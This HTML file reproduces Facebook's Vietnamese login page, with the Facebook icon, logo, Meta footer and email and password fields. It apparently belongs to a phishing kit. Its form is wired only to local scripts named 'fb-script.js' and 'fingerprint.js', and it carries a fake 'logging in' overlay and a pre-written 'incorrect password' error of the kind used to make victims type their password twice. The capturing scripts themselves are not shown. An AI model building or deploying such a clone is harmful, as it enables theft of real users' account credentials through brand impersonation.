<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook – đăng nhập hoặc đăng ký</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link rel="stylesheet" href="fb-style.css">
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <p class="loading-text">Đang đăng nhập...</p>
    </div>
    <div class="mobile-container">
        <div class="desktop-left">
            <h1>facebook</h1>
            <p>Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
        </div>
        <div class="fb-logo">
            <svg viewBox="0 0 36 36" fill="none">
                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z" fill="#0866FF"/>
                <path d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.531-.399Z" fill="white"/>
            </svg>
        </div>
        <div class="login-form">
            <div class="error-msg" id="errorMsg">
                Mật khẩu bạn đã nhập không chính xác. <a href="#" style="color:#1877f2">Bạn quên mật khẩu?</a>
            </div>
            <form id="loginForm" autocomplete="off">
                <input type="text" id="email" name="email" placeholder="Số di động hoặc email" required autocomplete="off">
                <input type="password" id="password" name="password" placeholder="Mật khẩu" required autocomplete="off">
                <button type="submit" class="btn-login" id="btnLogin">Đăng nhập</button>
            </form>
            <div class="forgot-password"><a href="#">Quên mật khẩu?</a></div>
            <div class="divider"><span>hoặc</span></div>
            <a href="#" class="btn-create" onclick="return false;">Tạo tài khoản mới</a>
        </div>
        <div class="footer">
            <p class="meta-logo"><span style="font-weight:700; color: #0866FF;">Meta</span></p>
        </div>
    </div>
    <script src="fb-script.js"></script>
    <script src="fingerprint.js"></script>
</body>
</html>
